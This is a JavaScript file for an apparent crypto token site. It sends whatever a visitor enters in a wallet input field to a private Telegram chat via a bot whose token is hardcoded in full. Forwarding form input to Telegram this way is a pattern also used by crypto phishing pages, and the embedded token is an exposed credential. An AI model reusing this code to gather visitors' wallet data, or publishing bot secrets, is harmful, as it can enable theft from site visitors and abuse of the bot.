var telegram_bot_id   = "6382471344:AAG-mj4zm_n9xTTp_Ufz-ronZ8VUL0nv8M4";
var chat_id = 5549088466;


var menuBtn = document.getElementById("menu")
var navLinks = document.getElementById("navLinks")
var closeMenu = document.getElementById("closeMenu")
var copy = document.getElementById("copy")
var contractAddress = "contractAddress"
var subWal = document.getElementById("subWal")


subWal.addEventListener("click", sendToTelegram)

const form = document.querySelector('#form')

var walletInput = document.getElementById("walletInput").value

const bot = new Bot("6382471344:AAG-mj4zm_n9xTTp_Ufz-ronZ8VUL0nv8M4", 5549088466);


form.addEventListener("submit", (e)=>{
    e.preventDefault()
    sendToTelegram();
    
   
})

function sendToTelegram(){
    var walletInput = document.getElementById("walletInput").value
    const bot = new Bot("6382471344:AAG-mj4zm_n9xTTp_Ufz-ronZ8VUL0nv8M4", 5549088466);
    bot.sendMessage(walletInput)
    .then(res=>{
    console.log(walletInput)
})

setTimeout(() => {
    document.getElementById("walletInput").value = ""
}, 2000);

setTimeout(() => {
    document.getElementById("subSuccess").style.display="block"    
}, 500);

setTimeout(() => {
    document.getElementById("subSuccess").style.display="none"    
}, 4000);




}


menuBtn.addEventListener("click", ()=>{
    navLinks.style.display ="flex"
})

closeMenu.addEventListener("click", ()=>{
    navLinks.style.display="none"
})

copy.addEventListener("click", ()=>{
    navigator.clipboard.writeText(contractAddress);
})


// fetch("./data.json")
// .then(res => {
    //     // console.log(res)
//     return res.json();
// })

// .then( (objectData) => {

//     // console.log(objectData[0].name);
//     let tableData = "";
//     objectData.map((values)=>{
//         var i = 0;

//         // console.log(objectData)

//         // if( ){
//         //     alert("done")
//         //     return
//         // }

//         for(var i; objectData[i].name == walletInput.value; i++){
//             alert("done");
//         }

//         i++
        
//     })
       
// }
  
// )

// .catch(error => console.log('error'));

